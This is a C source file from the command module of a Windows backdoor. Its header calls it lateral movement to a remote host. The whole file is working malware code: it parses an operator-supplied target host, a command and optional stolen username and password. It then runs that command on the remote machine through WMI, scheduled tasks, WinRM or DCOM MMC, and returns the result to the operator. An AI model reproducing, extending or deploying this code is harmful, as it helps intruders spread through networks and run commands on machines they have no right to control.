// chunk: commands/cmd_lateral
// depends: lateral/wmi_exec
// provides: cmd_lateral
// note: Backdoor command — lateral movement to remote host

#ifndef CHUNK_CMD_LATERAL
#define CHUNK_CMD_LATERAL

static int cmd_lateral(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    if (!args || args_len < 5) {
        const char *msg = "FAIL: Usage: method|host|command [|user|pass]";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    char method[32] = {0};
    char host[256] = {0};
    char command[1024] = {0};
    char user[128] = {0};
    char pass[128] = {0};

    char buf[2048] = {0};
    strncpy(buf, args, args_len < sizeof(buf) - 1 ? args_len : sizeof(buf) - 1);

    char *tok = strtok(buf, "|");
    if (tok) strncpy(method, tok, sizeof(method) - 1);
    tok = strtok(NULL, "|");
    if (tok) strncpy(host, tok, sizeof(host) - 1);
    tok = strtok(NULL, "|");
    if (tok) strncpy(command, tok, sizeof(command) - 1);
    tok = strtok(NULL, "|");
    if (tok) strncpy(user, tok, sizeof(user) - 1);
    tok = strtok(NULL, "|");
    if (tok) strncpy(pass, tok, sizeof(pass) - 1);

    if (method[0] == '\0' || host[0] == '\0' || command[0] == '\0') {
        const char *msg = "FAIL: Missing method, host, or command";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    int result = 0;

    if (strcmp(method, "wmi") == 0) {
        result = lateral_wmi_exec(host, command,
                                  user[0] ? user : NULL,
                                  pass[0] ? pass : NULL);
    }
#ifdef CHUNK_LATERAL_SCHTASKS_EXEC
    else if (strcmp(method, "schtasks") == 0) {
        char taskname[64];
        snprintf(taskname, sizeof(taskname), "task%08x", GetTickCount());
        result = lateral_schtasks(host, command, taskname);
    }
#endif
#ifdef CHUNK_LATERAL_WINRM_EXEC
    else if (strcmp(method, "winrm") == 0) {
        char output_buf[4096] = {0};
        DWORD output_len = sizeof(output_buf);
        result = lateral_winrm(host, command, output_buf, sizeof(output_buf), &output_len);
        if (result && output_len > 0) {
            DWORD copy_len = output_len < *out_len ? output_len : *out_len;
            memcpy(out, output_buf, copy_len);
            *out_len = copy_len;
            return 0;
        }
    }
#endif
#ifdef CHUNK_LATERAL_DCOM_MMC
    else if (strcmp(method, "dcom") == 0) {
        result = lateral_dcom_mmc(host, command);
    }
#endif
    else {
        result = lateral_wmi_exec(host, command,
                                  user[0] ? user : NULL,
                                  pass[0] ? pass : NULL);
    }

    if (result) {
        char msg[512];
        snprintf(msg, sizeof(msg), "OK: Lateral %s to %s: %s", method, host, command);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 0;
    } else {
        char msg[256];
        snprintf(msg, sizeof(msg), "FAIL: Lateral %s to %s failed", method, host);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }
}

#endif
